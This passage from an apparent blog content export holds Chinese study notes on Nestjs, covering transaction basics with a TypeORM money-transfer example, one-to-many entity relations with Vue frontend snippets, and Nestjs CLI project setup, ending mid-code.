<h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><p>事务具有四个基本特征：原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）、持久性（Duration），简称ACID</p>
<ul>
<li>原子性<ul>
<li>事务必须是一个原子的操作序列单元</li>
<li>事务中包含的各项操作在一次执行过程中，只允许出现两种状态之一，要么都成功，要么都失败</li>
<li>任何一项导致错误的操作都会导致整个事务的失败，同时其它已经被执行的操作都将被撤销并回滚，只有所有的操作全部成功，整个事务才算是成功完成</li>
</ul>
</li>
<li>一致性<ul>
<li>事务的执行不能破坏数据库数据的完整性和一致性</li>
<li>一个事务在执行之前和执行之后，数据库都必须处以一致性状态</li>
</ul>
</li>
<li>隔离性<ul>
<li>在并发环境中，并发的事务是互相隔离的，一个事务的执行不能被其它事务干扰</li>
<li>不同的事务并发操作相同的数据时，每个事务都有各自完整的数据空间</li>
<li>事务内部的操作及使用的数据对其它并发事务是隔离的，并发执行的各个事务是不能互相干扰的</li>
</ul>
</li>
<li>持久性<ul>
<li>事务一旦提交后，数据库中的数据必须被永久的保存下来</li>
<li>即使服务器系统崩溃或服务器宕机等故障，只要数据库重启，那么一定能够将其恢复到事务成功结束后的状态</li>
</ul>
</li>
</ul>
<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>魔理沙给灵梦转账514块的步骤：</p>
<ol>
<li>魔理沙的余额-514</li>
<li>灵梦的余额+514</li>
</ol>
<p>只要其中任何一个步骤失败了都算失败，更严重的是，如果步骤2失败了，相当于灵梦什么都没拿到，而魔理沙亏了514块</p>
<p>所以，需要保证转账的操作是一件事务</p>
<p>DTO：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">CreateManagerDto</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">money</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转账数据</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">giveMoneyDto</span> &#123;</span><br><span class="line">  <span class="attr">fromId</span>: <span class="built_in">number</span>; <span class="comment">// 发起人</span></span><br><span class="line">  <span class="attr">toId</span>: <span class="built_in">number</span>; <span class="comment">// 接收人</span></span><br><span class="line">  <span class="attr">money</span>: <span class="built_in">number</span>; <span class="comment">// 转款</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实体：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Column</span>, <span class="title class_">Entity</span>, <span class="title class_">PrimaryGeneratedColumn</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Manager</span> &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">money</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Controller：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转账操作接口</span></span><br><span class="line"><span class="meta">@Post</span>(<span class="string">&#x27;/giveMoney&#x27;</span>)</span><br><span class="line"><span class="title function_">giveMoney</span>(<span class="params"><span class="meta">@Body</span>() giveMoneyDto: giveMoneyDto</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">managerService</span>.<span class="title function_">giveMoney</span>(giveMoneyDto);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Service：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateManagerDto</span>, giveMoneyDto &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-manager.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateManagerDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-manager.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">InjectRepository</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Manager</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/manager.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Repository</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">ManagerService</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="meta">@InjectRepository</span>(Manager) <span class="keyword">private</span> <span class="keyword">readonly</span> money: Repository&lt;Manager&gt;,</span></span><br><span class="line"><span class="params">  </span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">giveMoney</span>(<span class="params">giveMoneyDto: giveMoneyDto</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(giveMoneyDto);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 开启事务</span></span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">money</span>.<span class="property">manager</span>.<span class="title function_">transaction</span>(<span class="keyword">async</span> (m) =&gt; &#123;</span><br><span class="line">        <span class="comment">// 获取发起人</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">from</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">money</span>.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">          <span class="attr">where</span>: &#123;</span><br><span class="line">            <span class="attr">id</span>: giveMoneyDto.<span class="property">fromId</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 获取收款人</span></span><br><span class="line">        <span class="keyword">const</span> to = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">money</span>.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">          <span class="attr">where</span>: &#123;</span><br><span class="line">            <span class="attr">id</span>: giveMoneyDto.<span class="property">toId</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 判断余额是否充足</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">from</span>.<span class="property">money</span> &gt;= giveMoneyDto.<span class="property">money</span>) &#123;</span><br><span class="line">          <span class="comment">// 余额充足，使用事务进行更新操作，参数1：要改的实体 参数2：要改的内容</span></span><br><span class="line">          <span class="comment">// 发起人的钱款减少</span></span><br><span class="line">          m.<span class="title function_">save</span>(<span class="title class_">Manager</span>, &#123;</span><br><span class="line">            <span class="attr">id</span>: giveMoneyDto.<span class="property">fromId</span>,</span><br><span class="line">            <span class="attr">money</span>: <span class="keyword">from</span>.<span class="property">money</span> - giveMoneyDto.<span class="property">money</span>,</span><br><span class="line">          &#125;);</span><br><span class="line">          <span class="comment">// 收款人的钱款增多</span></span><br><span class="line">          m.<span class="title function_">save</span>(<span class="title class_">Manager</span>, &#123;</span><br><span class="line">            <span class="attr">id</span>: giveMoneyDto.<span class="property">toId</span>,</span><br><span class="line">            <span class="attr">money</span>: to.<span class="property">money</span> + giveMoneyDto.<span class="property">money</span>,</span><br><span class="line">          &#125;);</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&#x27;转账成功&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&#x27;余额不足，无法发起转账&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>TypeOrm关系</title>
    <url>/web/study/Nestjs/21.TypeOrm%E5%85%B3%E7%B3%BB.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="多表联查"><a href="#多表联查" class="headerlink" title="多表联查"></a>多表联查</h1><p>业务数据通常会进行分表，把数据按含义分开存放，然后通过关联关系（外键）进行联合查询</p>
<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>在<a href="/web/study/Nestjs/20.CRUD">21</a>的案例中新增一个添加标签功能</p>
<h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><p>添加一点结构和逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 每列加了用于添加标签的按钮 --&gt;</span><br><span class="line">&lt;el-button @click=&quot;(isShowTag = true,row = scope.row)&quot;&gt;添加tag&lt;/el-button&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- --------------我是分割线-------------- --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 加了用于输入并添加标签的窗口 --&gt;</span><br><span class="line">&lt;el-dialog v-model=&quot;isShowTag&quot; title=&quot;添加tag&quot;&gt;</span><br><span class="line">  &lt;el-select style=&quot;width:100%&quot; v-model=&quot;tags&quot; multiple&gt;</span><br><span class="line">    &lt;el-option value=&quot;tag1&quot;&gt;tag1&lt;/el-option&gt;</span><br><span class="line">    &lt;el-option value=&quot;tag2&quot;&gt;tag2&lt;/el-option&gt;</span><br><span class="line">    &lt;el-option value=&quot;tag3&quot;&gt;tag3&lt;/el-option&gt;</span><br><span class="line">  &lt;/el-select&gt;</span><br><span class="line">  &lt;template #footer&gt;</span><br><span class="line">    &lt;el-button @click=&quot;addTag&quot; type=&quot;primary&quot;&gt;确定&lt;/el-button&gt;</span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">&lt;/el-dialog&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 加了用于添加标签的逻辑</span><br><span class="line">const isShowTag = ref&lt;boolean&gt;(false)</span><br><span class="line">const tags = ref&lt;string[]&gt;([])</span><br><span class="line">const row = ref&lt;&#123;</span><br><span class="line">  id?: number,</span><br><span class="line">  name?: string,</span><br><span class="line">  desc?: string,</span><br><span class="line">  createTime?: Date</span><br><span class="line">&#125;&gt;(&#123;&#125;)</span><br><span class="line">const addTag = async () =&gt; &#123;</span><br><span class="line">  const res = await addTags(&#123;</span><br><span class="line">    tags: tags.value,</span><br><span class="line">    userId: row.value.id</span><br><span class="line">  &#125;)</span><br><span class="line">  console.log(res)</span><br><span class="line">  isShowTag.value = false</span><br><span class="line">  tags.value = []</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 还加了联系后台添加标签的接口</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">addTags</span> = (<span class="params">data: &#123; tags: <span class="built_in">string</span>[]; userId: <span class="built_in">number</span> | <span class="literal">undefined</span>; &#125;</span>) =&gt; axios.<span class="title function_">post</span>(<span class="string">`/user/add/tags`</span>,data).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="property">data</span>)</span><br></pre></td></tr></table></figure>

<h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><p>一个用户可能拥有多个标签（反之，多个标签用于一个用户），它们是一对多（反之多对一）的关系：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308121640182.png"></p>
<p>在User文件夹中新建Tags实体：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Column</span>, <span class="title class_">Entity</span>, <span class="title class_">ManyToOne</span>, <span class="title class_">PrimaryGeneratedColumn</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">User</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Tags</span> &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>()</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 和User实体产生多对一的关联关系，@ManyToOne指多（自己）对一（关联实体）</span></span><br><span class="line">  <span class="comment">// 参数：函数返回一个与之关联的实体</span></span><br><span class="line">  <span class="meta">@ManyToOne</span>(<span class="function">() =&gt;</span> <span class="title class_">User</span>)</span><br><span class="line">  <span class="attr">user</span>: <span class="title class_">User</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>做好User实体和Tags实体的关联：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Column</span>, <span class="title class_">Entity</span>, <span class="title class_">OneToMany</span>, <span class="title class_">PrimaryGeneratedColumn</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Tags</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./tags.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;name&#x27;</span> &#125;)</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;desc&#x27;</span> &#125;)</span><br><span class="line">  <span class="attr">desc</span>: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 和Tags实体产生一对多的关联关系，@OneToMany指一（自己）对多（关联实体）</span></span><br><span class="line">  <span class="comment">// 参数1：函数返回一个与之关联的实体   参数2：函数返回一个反向关联时用的属性</span></span><br><span class="line">  <span class="meta">@OneToMany</span>(<span class="function">() =&gt;</span> <span class="title class_">Tags</span>, <span class="function">(<span class="params">tags</span>) =&gt;</span> tags.<span class="property">user</span>)</span><br><span class="line">  <span class="attr">tags</span>: <span class="title class_">Tags</span>[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Module中关联Tags表：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">TypeOrmModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">User</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/user.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Tags</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/tags.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">TypeOrmModule</span>.<span class="title function_">forFeature</span>([<span class="title class_">User</span>, <span class="title class_">Tags</span>])],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">UserController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">UserService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在Controller中添加提交标签的接口：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Post</span>(<span class="string">&#x27;/add/tags&#x27;</span>)</span><br><span class="line"><span class="title function_">addTags</span>(<span class="params"><span class="meta">@Body</span>() params: &#123; tags: <span class="built_in">string</span>[]; userId: <span class="built_in">number</span> &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">addTags</span>(params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Service中实现有关标签的逻辑：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-user.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-user.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">InjectRepository</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Repository</span>, <span class="title class_">Like</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">User</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/user.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Tags</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/tags.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">  <span class="comment">// 依赖注入，装饰器接收实体参数</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="meta">@InjectRepository</span>(User) <span class="keyword">private</span> <span class="keyword">readonly</span> user: Repository&lt;User&gt;,</span></span><br><span class="line"><span class="params">    <span class="meta">@InjectRepository</span>(Tags) <span class="keyword">private</span> <span class="keyword">readonly</span> tags: Repository&lt;Tags&gt;,</span></span><br><span class="line"><span class="params">  </span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加标签</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">addTags</span>(<span class="params">params: &#123; tags: <span class="built_in">string</span>[]; userId: <span class="built_in">number</span> &#125;</span>) &#123;</span><br><span class="line">    <span class="comment">// Tags数组</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">tagList</span>: <span class="title class_">Tags</span>[] = [];</span><br><span class="line">    <span class="comment">// 遍历标签</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; params.<span class="property">tags</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> T = <span class="keyword">new</span> <span class="title class_">Tags</span>();</span><br><span class="line">      T.<span class="property">name</span> = params.<span class="property">tags</span>[i];</span><br><span class="line">      <span class="comment">// 将标签逐个入表</span></span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">tags</span>.<span class="title function_">save</span>(T);</span><br><span class="line">      <span class="comment">// 将标签逐个添至数组</span></span><br><span class="line">      tagList.<span class="title function_">push</span>(T);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 找到对应的user数据</span></span><br><span class="line">    <span class="keyword">const</span> userInfo = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">      <span class="attr">where</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: params.<span class="property">userId</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 给user赋上关联关系（实际上是给tags表的userId列赋值）</span></span><br><span class="line">    userInfo.<span class="property">tags</span> = tagList;</span><br><span class="line">    <span class="comment">// 当实体实例中有主键时，save方法执行修改操作</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">save</span>(userInfo);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 查询所有User</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">findAll</span>(<span class="params">query: &#123; keyWord: <span class="built_in">string</span>; page: <span class="built_in">number</span>; pageSize: <span class="built_in">number</span> &#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(query.<span class="property">keyWord</span>);</span><br><span class="line">    <span class="keyword">const</span> list = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line">      <span class="comment">// 查询时添加关联关系，这样一来可以顺便查到tags表的关联内容了</span></span><br><span class="line">      <span class="attr">relations</span>: [<span class="string">&#x27;tags&#x27;</span>],</span><br><span class="line">      <span class="attr">where</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="title class_">Like</span>(<span class="string">`%<span class="subst">$&#123;query.keyWord&#125;</span>%`</span>),</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">order</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">&#x27;DESC&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">skip</span>: (query.<span class="property">page</span> - <span class="number">1</span>) * query.<span class="property">pageSize</span>,</span><br><span class="line">      <span class="attr">take</span>: query.<span class="property">pageSize</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> total = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">count</span>(&#123;</span><br><span class="line">      <span class="attr">where</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="title class_">Like</span>(<span class="string">`%<span class="subst">$&#123;query.keyWord&#125;</span>%`</span>),</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      list,</span><br><span class="line">      total,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Nestjs cli</title>
    <url>/web/study/Nestjs/3.Nestjs%20cli.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="创建Nestjs项目"><a href="#创建Nestjs项目" class="headerlink" title="创建Nestjs项目"></a>创建Nestjs项目</h1><p>安装Nestjs cli：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i -g @nestjs/cli</span><br></pre></td></tr></table></figure>

<p>创建项目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nest new [项目名称]</span><br></pre></td></tr></table></figure>

<p>启动项目：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nest start&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;start:dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nest start --watch&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;start:debug&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nest start --debug --watch&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;start:prod&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node dist/main&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<h1 id="Nest工程目录"><a href="#Nest工程目录" class="headerlink" title="Nest工程目录"></a>Nest工程目录</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307281655399.png"></p>
<h2 id="main-ts"><a href="#main-ts" class="headerlink" title="main.ts"></a>main.ts</h2><p>入口文件、主文件</p>
<p>它通过<code>NestFactory.create(AppModule)</code>创建一个app，使用<code>app.listen(3000)</code>监听一个端口</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="title function_">create</span>(<span class="title class_">AppModule</span>);</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>()</span><br></pre></td></tr></table></figure>

<h2 id="app-module-ts"><a href="#app-module-ts" class="headerlink" title="app.module.ts"></a>app.module.ts</h2><p>根模块，用于处理其他类的引用与共享</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">AppService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="app-controller-ts"><a href="#app-controller-ts" class="headerlink" title="app.controller.ts"></a>app.controller.ts</h2><p>控制器，控制路由，常用于处理http请求，并调用service层处理方法</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Controller</span>, <span class="title class_">Get</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppController</span> &#123;</span><br><span class="line">  <span class="comment">// 看，我就是依赖注入</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> appService: AppService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  